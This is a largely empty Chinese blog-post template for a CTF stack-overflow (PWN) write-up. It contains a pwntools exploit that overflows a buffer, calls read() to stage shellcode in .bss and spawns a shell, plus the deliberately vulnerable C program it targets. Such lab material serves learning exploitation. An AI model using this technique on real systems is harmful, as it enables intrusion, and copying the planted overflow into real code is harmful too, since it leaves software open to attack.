---
layout:     post
title:      模版
subtitle:   解题思路
date:       2018-07-05
author:     Mao
header-img: img/home-bg-geek.jpg
catalog: true
tags:
    - PWN
    - 栈溢出
---



## 所需环境

环境要求

> ubuntu 16.04 64bit
>
> python 2.7



所需工具

> pwntools
>
> gdb-peda
>
> 32位 ida





## 分析过程





## 解题思路

思路



exp.py

```python
#!/usr/bin/env python

from pwn import *

sh = process('./stack_shellcode')
a = ELF('./stack_shellcode')

bss_addr = 0x0804a040
read_plt = a.plt['read']

sh.sendline('a'*112 + p32(read_plt) + p32(bss_addr) + p32(0) + p32(bss_addr) + p32(100))
print sh.recv()
shellcode = asm(shellcraft.sh())
sh.sendline(shellcode.ljust(len(shellcode)))
sh.interactive()
```



stack_shellcode.c

```c
#include <stdio.h>

#include <unistd.h>

#include <string.h>


void deal_user_info(char* name)
{
    char dealed_name[100];
    memcpy(dealed_name, name, 200);
}

int main()
{
    setbuf(stdin, 0);
    setbuf(stdout, 0);
    setbuf(stderr, 0);

    char name[200];

    puts("welcome\n");
    read(STDIN_FILENO, name, 200);
    deal_user_info(name);
    printf("bye\n");
}
```



## 总结



